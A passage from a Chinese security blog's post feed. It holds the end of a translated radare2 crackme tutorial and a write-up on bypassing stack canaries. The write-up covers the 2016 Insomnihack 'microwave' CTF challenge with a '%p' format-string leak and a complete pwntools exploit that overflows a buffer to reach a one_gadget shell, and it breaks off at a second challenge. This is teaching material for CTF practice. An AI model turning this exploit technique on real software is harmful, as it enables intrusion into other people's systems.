S*~text:0[3]; f t @ section..textf ds @ S*~data:0[3]; f d @ section..data.ad t t+ts @ d:ds 我通常开始分析时会执行aa（analyse all）。这个名称有一点容易误解，因为除此之外还有很多可以分析的（执行aa?可以看到更多的用法），但对于这个程序来说已经足够了。这次我们直接执行aaa，更简单些。你也可以执行radare2用-A参数来分析文件，直接在开始就执行aaa（例如r2 -A megabeets_0x1） 123456[0x08048370]&gt; aaa[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze len bytes of instructions for references (aar)[x] Analyze function calls (aac)[*] Use -AA or aaaa to perform additional experimental analysis.[x] Constructing a function name for fcn.* and sym.func.* functions (aan) 标志在分析之后，radare2把一些特定的名字和偏移联系在一起，例如区段、函数、符号表、字符串等等。他们被称作为标志。标志被整合进标志空间，一个标志空间是所有类似特征的标志的集合。执行fs以查看所有的标志： 1234567[0x08048370]&gt; fs0 4 . strings1 35 . symbols2 82 . sections3 5 . relocs4 5 . imports5 1 . functions 我们可以使用fs &lt;flagspace&gt;来查看某个特定的标志空间，然后用f输出所有的标志。我们使用分号将一行中的多个命令分开（比如命令一; 命令二; 命令三;...）。 123456[0x08048370]&gt; fs imports; f0x08048320 6 sym.imp.strcmp0x08048330 6 sym.imp.strcpy0x08048340 6 sym.imp.puts0xffffffff 16 loc.imp.__gmon_start__0x08048350 6 sym.imp.__libc_start_main 正如我们所看到的，radare2将所有程序所使用的导入表输出——可以看到我们所熟悉的strcmp、strcpy、puts等，包括相关的地址。我们也可以列出字符串的标志空间。 12345[0x08048370]&gt; fs strings; f0x08048700 21 str._n__.::_Megabeets_::.0x08048715 23 str.Think_you_can_make_it_0x0804872c 10 str.Success__n0x08048736 22 str.Nop__Wrong_argument._n 字符串我们看到r2列出了一些字符串的偏移，还有一些变量名。让我们主要来看看字符串。有很多可以列出程序中字符串的方式，你可以选择你最需要的一种。iz – 列出在数据短的字符串izz – 在整个程序中查找字符串 12345[0x08048370]&gt; izvaddr=0x08048700 paddr=0x00000700 ordinal=000 sz=21 len=20 section=.rodata type=ascii string=\\n .:: Megabeets ::.vaddr=0x08048715 paddr=0x00000715 ordinal=001 sz=23 len=22 section=.rodata type=ascii string=Think you can make it?vaddr=0x0804872c paddr=0x0000072c ordinal=002 sz=10 len=9 section=.rodata type=ascii string=Success!\\nvaddr=0x08048736 paddr=0x00000736 ordinal=003 sz=22 len=21 section=.rodata type=ascii string=Nop, Wrong argument.\\n 我们已经熟悉了大部分字符串——还记得我们一开始运行程序时的那几行字符串吧。但是我们没有看到Success，这应该是我们输入正确字符串后的提示。既然我们已经得到了字符串，让我们看看它们在程序的什么地方被使用了。 12345[0x08048370]&gt; axt @@ str.*data 0x8048609 push str._n__.::_Megabeets_::. in maindata 0x8048619 push str.Think_you_can_make_it_ in maindata 0x8048646 push str._n_tSuccess__n in maindata 0x8048658 push str._n_tNop__Wrong_argument._n in main 这个命令展示给我们radare2更多的特点。axt命令用来在数据段或程序段交叉查找某个地址（试试ax?）。@@是一个迭代器标志，用来在一段偏移上重复某个命令（试试@@?）。str.*是一个对所有开头为str.的标志的通配。这条命令能帮助我列出字符串标志以及对应所在的函数名。在这之前要确保选择了字符串的标志空间（默认时是fs *）。 定位正如我之前所说的，之前我们一直在程序的入口点，现在应该去其他地方看看了。我们刚列出来的字符串都是在main函数中的。为了定位到字符串，我们需要使用seek命令，用s替代。正如大家所知道的，在（几乎）每个命令后加上?会解决你所有的问题。 123456789101112131415161718192021222324[0x08048370]&gt; s?|Usage: s # Seek commands| s Print current address| s addr Seek to address| s- Undo seek| s- n Seek n bytes backward| s– Seek blocksize bytes backward| s+ Redo seek| s+ n Seek n bytes forward| s++ Seek blocksize bytes forward| s[j*=] List undo seek history (JSON, =list, *r2)| s/ DATA Search for next occurrence of ‘DATA’| s/x 9091 Search for next occurrence of \\x90\\x91| s.hexoff Seek honoring a base from core-&gt;offset| sa [[+-]a] [asz] Seek asz (or bsize) aligned to addr| sb Seek aligned to bb start| sC[?] string Seek to comment matching given string| sf Seek to next function (f-&gt;addr+f-&gt;size)| sf function Seek to address of specified function| sg/sG Seek begin (sg) or end (sG) of section or file| sl[?] [+-]line Seek to line| sn/sp Seek next/prev scr.nkey| so [N] Seek to N next opcode(s)| sr pc Seek to register seek命令是接收一个地址或是一个数学表达式作为参数。这个表达式可以是数学运算、标志或者内存访问操作。我们可以执行s main来定位到main函数。让我们先通过afl命令（Analyze Functions List）来查看radare2为我们列出了哪些函数。 12345678910111213141516171819[0x08048370]&gt; afl0x080482ec 3 35 sym._init0x08048320 1 6 sym.imp.strcmp0x08048330 1 6 sym.imp.strcpy0x08048340 1 6 sym.imp.puts0x08048350 1 6 sym.imp.__libc_start_main0x08048360 1 6 sub.__gmon_start___252_3600x08048370 1 33 entry00x080483a0 1 4 sym.__x86.get_pc_thunk.bx0x080483b0 4 43 sym.deregister_tm_clones0x080483e0 4 53 sym.register_tm_clones0x08048420 3 30 sym.__do_global_dtors_aux0x08048440 4 43 -&gt; 40 sym.frame_dummy0x0804846b 19 282 sym.rot130x08048585 1 112 sym.beet0x080485f5 5 127 main0x08048680 4 93 sym.__libc_csu_init0x080486e0 1 2 sym.__libc_csu_fini0x080486e4 1 20 sym._fini 这些导入函数正是我们之前所看到的，包括入口点、libc、main函数和两个引人注意的函数分别叫做sym.beet和sym.rot13。 反汇编main函数是时候去看看汇编代码了。首先我们用s main来定位到main函数，然后用pdf命令（Print Disassemble Function）来反汇编。注意地址是怎么准确地变成main函数的地址的。 注意：正如我之前所说的，这篇文章的目的是教大家学习和了解radare2，而不是教汇编语言的。因此我不会彻底地解释代码。实际上，这个程序也很简单，你只要有一点点基础的逆向工程知识就能掌握。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354[0x08048370]&gt; s main[0x080485f5]&gt; pdf ;– main:/ (fcn) main 127| main ();| ; var int local_8h @ ebp-0x8| ; var int local_4h @ esp+0x4| ; DATA XREF from 0x08048387 (entry0)| 0x080485f5 8d4c2404 lea ecx, [esp + local_4h] ; 0x4| 0x080485f9 83e4f0 and esp, 0xfffffff0| 0x080485fc ff71fc push dword [ecx – 4]| 0x080485ff 55 push ebp| 0x08048600 89e5 mov ebp, esp| 0x08048602 53 push ebx| 0x08048603 51 push ecx| 0x08048604 89cb mov ebx, ecx| 0x08048606 83ec0c sub esp, 0xc| 0x08048609 6800870408 push str._n__.::_Megabeets_::. ; str._n__.::_Megabeets_::.| 0x0804860e e82dfdffff call sym.imp.puts ; int puts(const char *s)| 0x08048613 83c410 add esp, 0x10| 0x08048616 83ec0c sub esp, 0xc| 0x08048619 6815870408 push str.Think_you_can_make_it_ ; “Think you can make it?” @ 0x8048715| 0x0804861e e81dfdffff call sym.imp.puts ; int puts(const char *s)| 0x08048623 83c410 add esp, 0x10| 0x08048626 833b01 cmp dword [ebx], 1 ; [0x1:4]=0x1464c45| ,=&lt; 0x08048629 7e2a jle 0x8048655| | 0x0804862b 8b4304 mov eax, dword [ebx + 4] ; [0x4:4]=0x10101| | 0x0804862e 83c004 add eax, 4| | 0x08048631 8b00 mov eax, dword [eax]| | 0x08048633 83ec0c sub esp, 0xc| | 0x08048636 50 push eax| | 0x08048637 e849ffffff call sym.beet| | 0x0804863c 83c410 add esp, 0x10| | 0x0804863f 85c0 test eax, eax| ,==&lt; 0x08048641 7412 je 0x8048655| || 0x08048643 83ec0c sub esp, 0xc| || 0x08048646 682c870408 push str.Success__n ; “Success!.” @ 0x804872c| || 0x0804864b e8f0fcffff call sym.imp.puts ; int puts(const char *s)| || 0x08048650 83c410 add esp, 0x10| ,===&lt; 0x08048653 eb10 jmp 0x8048665| ||| ; JMP XREF from 0x08048629 (main)| ||| ; JMP XREF from 0x08048641 (main)| |-&gt; 0x08048655 83ec0c sub esp, 0xc| | 0x08048658 6836870408 push str.Nop__Wrong_argument._n ; “Nop, Wrong argument..” @ 0x8048736| | 0x0804865d e8defcffff call sym.imp.puts ; int puts(const char *s)| | 0x08048662 83c410 add esp, 0x10| | ; JMP XREF from 0x08048653 (main)| `—&gt; 0x08048665 b800000000 mov eax, 0| 0x0804866a 8d65f8 lea esp, [ebp – local_8h]| 0x0804866d 59 pop ecx| 0x0804866e 5b pop ebx| 0x0804866f 5d pop ebp| 0x08048670 8d61fc lea esp, [ecx – 4]\\ 0x08048673 c3 ret 看过汇编代码后，我们可以写出一段简单的伪代码： 12345678910111213if (argc &gt; 1 &amp;&amp; beet(argv[1]) == true) # i.e - if any argument passed to the program AND the result of beet, given the passed argument, is true# argc is the number of arguments passed to the program# argc will be at least 1 becuase the first argument is the program name# argv is the array of parameters passed to the program&#123; print \"success\"&#125;else&#123; print \"fail\"&#125; exit 可视化模式和图形模式radare2有着一个非常强大、效率极高的可视化模式。可视化模式对用户非常友好并且将使用r2的逆向过程带到了一个新的高度。按下V键开启可视化模式。按下p/P键用来切换模式。在屏幕的最上方可以看到你输入的命令。这里按p可以切换回原来的反汇编模式。 可视化模式基本命令移动你可以通过k向上移动，通过j向下移动。回车键可以jmp或者call到目标地址。同时在每个jmp或call右侧注释的方括号中有数字，直接按相应的数字可跳转到对应地址。 帮助正如之前命令行下的radare2，按下?可以为你展现帮助窗口，你可以学习可视化模式下的各个命令。 交叉引用用x/X分别来列出当前函数的引用和调用的情况。按下对应数字来跳转。 radare2命令使用：在可视化模式下输入:command来执行r2命令 注释你可以通过;[-]comment来添加或删去注释。 标记m&lt;key&gt;可以用来标记特定的偏移地址。&#39;&lt;key&gt;来跳到指定地址。 退出按下q键返回到r2的shell。 可视化图形模式和其他的一些反汇编器一样，radare2也有图形视图。你可以输入VV从shell进入图形视图，通过k/j/h/l向上/下/左/右移动，按g键跳转到目标函数（例如gd）。 按?来列出所有的命令，其中R命令值得一学。 反汇编beet函数接下来回到反汇编函数上，看看beet函数。正如我们之前所看到的，我们的程序检查了beet的返回结果，也就是我们输入的参数。我们可以通过一些方式输出beet的返回值，这里列出几种： 在r2的shell中定位到beet函数，然后通过s sym.beet（sym.beet是beet函数的一个标志。你可以通过f sym.&lt;tab&gt;输出出sym的标志）输出函数，然后执行pdf（Print Disassemble Function）； 在r2的shell下，通过pdf @ sym.beet输出beet函数。@是临时的定位（输出sym.beet地址处的函数）； 可视化模式下在main函数下跳到beet函数； 可视化图形界面下在main函数中使用gd（d是call边上的字母） 这是beet函数在图形视图下的样子： 我们可以看到输入的参数被复制给了一个缓冲空间。缓存区的位置在ebp - local_88h。local_88h其实是0x88，也就是十进制的136。在可视化模式下，我们可以用:执行r2的命令? 0x88查看。 12:&gt; ? 0x88136 0x88 0210 136 0000:0088 136 “\\x88” 10001000 136.0 136.000000f 136.000000 由于4个字节保存了前一个栈帧的ebp值，接下来的4个字节则是返回地址，因此在栈上的缓冲区大小为128个字节，总共为136个字节。 在缓冲区之后是我们输入的参数，它和函数sym.rot13的结果进行比较。Rot-13是一个著名的置换加密，经常在CTF以及Crackme中使用。这个函数接收了9个十六进制数，看起来radare2没有把它们识别成一个字符串。我们可以在其地址上执行ahi s。 1:&gt; ahi s @@=0x080485a3 0x080485ad 0x080485b7 ahi s用来将将具体地址转换成字符串（试试ahi?）。@@是一个迭代器（试试@@），然后这些地址则是sym.beet函数中没被radare2识别成字符串的部分。执行完这条命令后，图形视图会自动刷新（如果没有自动刷新，执行r）成这样： 看起来没被识别出来的字符串是Megabeets（根据字节序反向压栈得到）。 该程序通过strcmp将经过rot13处理后的Megabeets与我们输入的参数进行比较。幸运的是我们不需要辛苦地分析rot13的具体算法，因为r2框架中的rahash2工具已经包含了rot13加密。 rahash2通过不同的算法计算文件或是字符串的校验值。 使用man rahash2查看更多的用法。 12:&gt; !rahash2 -E rot -S s:13 -s ‘Megabeets\\n’Zrtnorrgf rahash2执行了rot13(“Megabeets”)后得到了字符串Zrtnorrgf。输入!可以在r2的shell下执行系统命令。我们假设Zrtnorrgf就是要和我们的输入进行比较的字符串。让我们在调试模式下打开程序，使用ood（试试ood?）并将Zrtnorrgf作为参数，看看我们会得到什么。 12345678910111213[0xf7749be9]&gt; ood?| ood [args] reopen in debugger mode (with args)[0xf7749be9]&gt; ood ZrtnorrgfWait event received by different pid 7415Wait event received by different pid 7444Process with PID 7575 started…File dbg:///home/remnux/Desktop/tutorials/megabeets_0x1 Zrtnorrgf reopened in read-write mode= attach 7575 7575Assuming filepath /home/remnux/Desktop/tutorials/megabeets_0x1[0xf7749be9]&gt; dcSelecting and continuing: 7575.:: Megabeets ::.Think you can make it?Success!PTRACE_EVENT_EXIT pid=7575, status=0x0 我们收到了成功的提示，破解了这个Crackme。在成功破解之后，我们终于可以说这个程序就是将我们输入的第一个参数与rot13(“Megabeets”)进行了比较，也就是Zrtnorrgf。 你可以在这里查看Crackme的完整源码。 后记Radare2之旅第一部分就告一段落了。我们只接触了radare2的表皮，仅仅了解了它最最基础的一些功能。在下一部分中，我们将会学习更多的关于radare2的功能，包括脚本处理、恶意软件分析和漏洞利用。我知道对于很多人来说一开始是很难的，不管是能否感受到radare2的强大之处，亦或是将你的以前的习惯放到一边而熟悉使用radare2。不管你是一个逆向工程师、一个CTF比赛选手或者只是一个安全爱好者，我敢保证将radare2收入你的工具箱绝对一个是明智的选择。","categories":[],"tags":[{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"},{"name":"translation","slug":"translation","permalink":"https://qianfei11.github.io/tags/translation/"}]},{"title":"绕过ELF的安全防护机制Canary","slug":"【未完成】绕过ELF的安全防护机制Canary","date":"2019-02-15T08:21:43.000Z","updated":"2019-02-18T10:58:18.432Z","comments":true,"path":"2019/02/15/【未完成】绕过ELF的安全防护机制Canary/","link":"","permalink":"https://qianfei11.github.io/2019/02/15/【未完成】绕过ELF的安全防护机制Canary/","excerpt":"入门canary。","text":"入门canary。 何为Canary由于stack overflow而引发的攻击非常普遍也非常古老，相应地一种叫做Canary的技术很早就出现在glibc里，直到现在也作为系统安全的第一道防线存在。Canary的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。这个概念应用在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的canary值，栈帧销毁前测试该值是否死掉，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。Canary不管是实现还是设计思想都比较简单高效，就是插入一个值，在stack overflow发生的高危区域的尾部，当函数返回之时检测Canary的值是否经过了改变，以此来判断stack/buffer overflow是否发生。Canary与Windows下的GS保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了linux下保护机制的标配。 以32位程序为例。没开Canary时的栈： 1234567891011+------------------+| parameter |+------------------+| local var1 |+------------------+| local var2 |+------------------+| ebp |+------------------+| return addr |+------------------+ 开启Canary后的栈： 12345678910111213+------------------+| parameter |+------------------+| local var1 |+------------------+| local var2 |+------------------+| canary | &lt;- Random+------------------+| ebp |+------------------+| return addr |+------------------+ 在EBP之前增加了一个不可预测的随机值并在程序中，而且在程序结尾处会检测Canary是否被篡改。如果发生了缓冲区溢出覆盖了返回地址则肯定会覆盖Canary，这时程序会直接退出。只有泄漏了Canary，才能overflow后面的return address： 123456789 0x804852b &lt;func+71&gt;: mov eax,DWORD PTR [ebp-0xc] 0x804852e &lt;func+74&gt;: xor eax,DWORD PTR gs:0x14=&gt; 0x8048535 &lt;func+81&gt;: je 0x804853c &lt;func+88&gt; | 0x8048537 &lt;func+83&gt;: call 0x8048390 &lt;__stack_chk_fail@plt&gt; | 0x804853c &lt;func+88&gt;: leave | 0x804853d &lt;func+89&gt;: ret | 0x804853e &lt;main&gt;: lea ecx,[esp+0x4] |-&gt; 0x804853c &lt;func+88&gt;: leave 0x804853d &lt;func+89&gt;: ret 如果没有绕过Canary，就会call到glibc中的函数__stack_chk_fail： 1234567891011void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (\"stack smashing detected\");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\");&#125; Canary绕过技术泄漏CanaryCanary设计为以字节\\x00结尾，本意是为了保证Canary可以截断字符串。泄露栈中的Canary的思路是覆盖Canary的低字节，来打印出剩余的Canary部分。这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露Canary，之后再次溢出控制执行流程。如果存在format string那么还可以泄漏Canary。 2016-insomnihack-microwavechecksec一下程序，64位elf，保护全开： 1234567[*] '/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 拖进ida查看一下程序。程序大概上是连接tweeter账户，编辑内容，发布最喜爱食物： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; char *v3; // r12 char input; // [rsp+0h] [rbp-38h] unsigned __int64 v5; // [rsp+8h] [rbp-30h] v5 = __readfsqword(0x28u); setbuf(stdout, 0LL); v3 = (char *)malloc(0x3EuLL); puts(\"\\n --------------------------------------------------------\"); puts(\" | Welcome to the next generation of MicroWaves! |\"); puts(\" | *** |\"); puts(\" | This stylish Microwave with Grill function, includes |\"); puts(\" | a function that tweets your favourite food! |\"); puts(\" | *** |\"); puts(\" --------------------------------------------------------\"); fflush(0LL); while ( 1 ) &#123; while ( 1 ) &#123; choice(); fwrite(\"\\n [MicroWave]: \", 1uLL, 0x19uLL, stdout); fgets(&amp;input, 3, stdin); if ( input != '2' ) break; if ( *((_WORD *)v3 + 30) == 1 ) edit(); else fwrite(\"\\n First: please connect to your Twitter account!\\n\\n\", 1uLL, 0x37uLL, stdout); &#125; if ( input &lt;= '2' ) &#123; if ( input == '1' ) // choice 1 &#123; fwrite(\"\\n Log in on Twitter:\\n\", 1uLL, 0x1FuLL, stdout); fwrite(\" username: \", 1uLL, 0x15uLL, stdout); fflush(0LL); fgets(v3, 40, stdin); fwrite(\" password: \", 1uLL, 0x15uLL, stdout); fflush(0LL); fgets(v3 + 40, 20, stdin); connect(v3); &#125; &#125; else if ( input == '3' ) // choice 3 &#123; if ( *((_WORD *)v3 + 30) == 1 ) tweet(); else fwrite(\"\\n Hey Dude! This didn't work out!\\n\\n\", 1uLL, 0x28uLL, stdout); &#125; else if ( input == 'q' ) // quit &#123; fwrite(\"\\n Bye!\\n\\n\", 1uLL, 0x12uLL, stdout); exit(0); &#125; &#125;&#125; 在connect()函数中，发现了一个需要过的check密码，同时还有用户名的输入存在format string，故这里可以泄漏出栈上的Canary： 12345678910111213141516171819202122232425262728293031323334353637unsigned __int64 __fastcall connect(char *input)&#123; size_t j; // rbx char *string; // rbx size_t v3; // rax __int64 i; // rdx unsigned __int64 v6; // [rsp+8h] [rbp-20h] j = 1LL; v6 = __readfsqword(0x28u); __printf_chk(1LL, (__int64)\"\\nChecking \"); __printf_chk(1LL, (__int64)input); puts(\"Twitter account\"); fflush(0LL); while ( j &lt; strlen(input + 40) ) &#123; ++j; putchar('.'); fflush(0LL); usleep(0x186A0u); &#125; putchar('\\n'); string = password; v3 = strlen(password); for ( i = 0LL; ; ++i ) &#123; if ( i == v3 ) &#123; *((_WORD *)input + 30) = 1; return __readfsqword(0x28u) ^ v6; &#125; if ( input[i + 40] != string[i] ) break; &#125; *((_WORD *)input + 30) = 0; return __readfsqword(0x28u) ^ v6;&#125; 在edit()函数中存在buffer overflow，读了很长一串字符： 123456789101112unsigned __int64 edit()&#123; __int64 v1; // [rsp+0h] [rbp-418h] unsigned __int64 v2; // [rsp+408h] [rbp-10h] v2 = __readfsqword(0x28u); __printf_chk(1LL, (__int64)\"\\n #&gt; \"); fflush(0LL); read(0, &amp;v1, 0x800uLL); puts(\"\\n Done.\"); return __readfsqword(0x28u) ^ v2;&#125; 同时通过调试可以找到栈上的某个值与libc的偏移，以用来计算base： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115assassinq@ubuntu ~/pwn/ctf-wiki/canary/2016-insomnihack-microwave$ gdb ./microwaveGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot;and &quot;show warranty&quot; for details.This GDB was configured as &quot;x86_64-linux-gnu&quot;.Type &quot;show configuration&quot; for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type &quot;help&quot;.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...Reading symbols from ./microwave...(no debugging symbols found)...done.assassinq&gt;&gt; set environment LD_LIBRARY_PATH=./libc.so.6assassinq&gt;&gt; rStarting program: /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave -------------------------------------------------------- | Welcome to the next generation of MicroWaves! | | *** | | This stylish Microwave with Grill function, includes | | a function that tweets your favourite food! | | *** | -------------------------------------------------------- ---------------------------------- | 1. Connect to Twitter account | | 2. Edit your tweet | | 3. Grill &amp; Tweet your food | | q. Exit | ---------------------------------- [MicroWave]: 1 Log in on Twitter: username: %p.%p.%p.%p.%p.%p.%p.%p password: n07_7h3_fl46Checking 0x7ffff7dd3780.0x7ffff7b042c0.0x7ffff7fd8700.0xa.(nil).0x82f154bf635c9900.0x7ffff7dd2708.0x7ffff7dd2710Twitter account............ ---------------------------------- | 1. Connect to Twitter account | | 2. Edit your tweet | | 3. Grill &amp; Tweet your food | | q. Exit | ---------------------------------- [MicroWave]: ^CProgram received signal SIGINT, Interrupt.[----------------------------------registers-----------------------------------]RAX: 0xfffffffffffffe00 RBX: 0x7ffff7dd18e0 --&gt; 0xfbad2288 RCX: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;: cmp rax,0xfffffffffffff001)RDX: 0x400 RSI: 0x555555759060 (&quot;n07_7h3_fl46\\np.%p.%p.%p\\n&quot;)RDI: 0x0 RBP: 0x7ffff7dd2620 --&gt; 0xfbad2887 RSP: 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;: cmp rax,0x0)RIP: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;: cmp rax,0xfffffffffffff001)R8 : 0x7ffff7dd3780 --&gt; 0x0 R9 : 0x7ffff7fd8700 (0x00007ffff7fd8700)R10: 0x7ffff7fd8700 (0x00007ffff7fd8700)R11: 0x246 R12: 0xa (&apos;\\n&apos;)R13: 0x2 R14: 0x55555575906d (&quot;p.%p.%p.%p\\n&quot;)R15: 0x7ffff7dd18e0 --&gt; 0xfbad2288EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x7ffff7b04257 &lt;read+7&gt;: jne 0x7ffff7b04269 &lt;read+25&gt; 0x7ffff7b04259 &lt;__read_nocancel&gt;: mov eax,0x0 0x7ffff7b0425e &lt;__read_nocancel+5&gt;: syscall =&gt; 0x7ffff7b04260 &lt;__read_nocancel+7&gt;: cmp rax,0xfffffffffffff001 0x7ffff7b04266 &lt;__read_nocancel+13&gt;: jae 0x7ffff7b04299 &lt;read+73&gt; 0x7ffff7b04268 &lt;__read_nocancel+15&gt;: ret 0x7ffff7b04269 &lt;read+25&gt;: sub rsp,0x8 0x7ffff7b0426d &lt;read+29&gt;: call 0x7ffff7b220d0 &lt;__libc_enable_asynccancel&gt;[------------------------------------stack-------------------------------------]0000| 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;: cmp rax,0x0)0008| 0x7fffffffda30 --&gt; 0x7ffff7dd26a3 --&gt; 0xdd3780000000000a 0016| 0x7fffffffda38 --&gt; 0x7ffff7dd18e0 --&gt; 0xfbad2288 0024| 0x7fffffffda40 --&gt; 0x7fffffffdae0 --&gt; 0x7fffff000a31 0032| 0x7fffffffda48 --&gt; 0x7ffff7a8860e (&lt;__GI__IO_default_uflow+14&gt;: cmp eax,0xffffffff)0040| 0x7fffffffda50 --&gt; 0x0 0048| 0x7fffffffda58 --&gt; 0x7ffff7a7bc6a (&lt;__GI__IO_getline_info+170&gt;: cmp eax,0xffffffff)0056| 0x7fffffffda60 --&gt; 0x19 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGINT0x00007ffff7b04260 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:8484 ../sysdeps/unix/syscall-template.S: No such file or directory.assassinq&gt;&gt; vmmap Start End Perm Name0x0000555555554000 0x0000555555557000 r-xp /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave0x0000555555757000 0x0000555555758000 r--p /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave0x0000555555758000 0x0000555555759000 rw-p /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave0x0000555555759000 0x000055555577a000 rw-p [heap]0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fd7000 0x00007ffff7fda000 rw-p mapped0x00007ffff7ff7000 0x00007ffff7ffa000 r--p [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p mapped0x00007ffffffdd000 0x00007ffffffff000 rw-p [stack]0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall] 最后放上exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/env pythonfrom pwn import *# context.log_level = &apos;debug&apos;context.arch = &apos;amd64&apos;local = 0if local: p = process(&apos;./microwave&apos;) libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;) libc_base_offset = 0xf72c0 one_gadget_offset = 0x45216else: p = remote(&apos;127.0.0.1&apos;, 1337) libc = ELF(&apos;./libc.so.6&apos;) libc_base_offset = 0xeb870 one_gadget_offset = 0x464d8elf = ELF(&apos;./microwave&apos;)log.success(&apos;libc_base_offset = &apos; + hex(libc_base_offset))log.success(&apos;one_gadget_offset = &apos; + hex(one_gadget_offset))def connect(username, password): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;1&apos;) p.sendlineafter(&apos;username:&apos;, username) p.sendlineafter(&apos;password:&apos;, password)def edit(content): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;2&apos;) p.sendlineafter(&apos;#&gt;&apos;, content)def tweet(): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;3&apos;)def quit(): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;q&apos;)# gdb.attach(p)password = &apos;n07_7h3_fl46&apos;connect(&apos;%p.&apos; * 8, password)p.recvuntil(&apos;Checking&apos;)leak_data = p.recvline().strip().split(&apos;.&apos;)[:-1]print leak_datacanary = int(leak_data[5][2:], 16)log.success(&apos;canary = &apos; + hex(canary))leak_libc = int(leak_data[1][2:], 16)log.success(&apos;leak_libc = &apos; + hex(leak_libc))libc_base = leak_libc - libc_base_offsetlog.success(&apos;libc_base = &apos; + hex(libc_base))one_gadget = libc_base + one_gadget_offsetlog.success(&apos;one_gadget = &apos; + hex(one_gadget))payload = flat([ &apos;A&apos; * 1032, canary, &apos;B&apos; * 8, one_gadget])edit(payload)p.interactive() 2017-CSAW-Quals-scv开了Canary： 123456[*] &apos;/home/assassinq/pwn/ctf-wiki/canary/2017-CSAW-Quals-csv/scv&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 就只有一个main函数，由于是c++程序，看起来有点混乱： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 v3; // rax __int64 v4; // rax __int64 v5; // rax __int64 v6; // rax __int64 v7; // rax __int64 v8; // rax __int64 v9; // rax __int64 v10; // rax __int64 v11; // rax __int64 v12; // rax __int64 v13; // rax __int64 v14; // rax __int64 v15; // rax __int64 v16; // rax __int64 v17; // rax __int64 v18; // rax __int64 v19; // rax __int64 v20; // rax __int64 v21; // rax int choice; // [rsp+4h] [rbp-BCh] int v24; // [rsp+8h] [rbp-B8h] int v25; // [rsp+Ch] [rbp-B4h] char buf; // [rsp+10h] [rbp-B0h] unsigned __int64 v27; // [rsp+B8h] [rbp-8h] v27 = __readfsqword(0x28u); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); choice = 0; v24 = 1; v25 = 0; while ( v24 ) 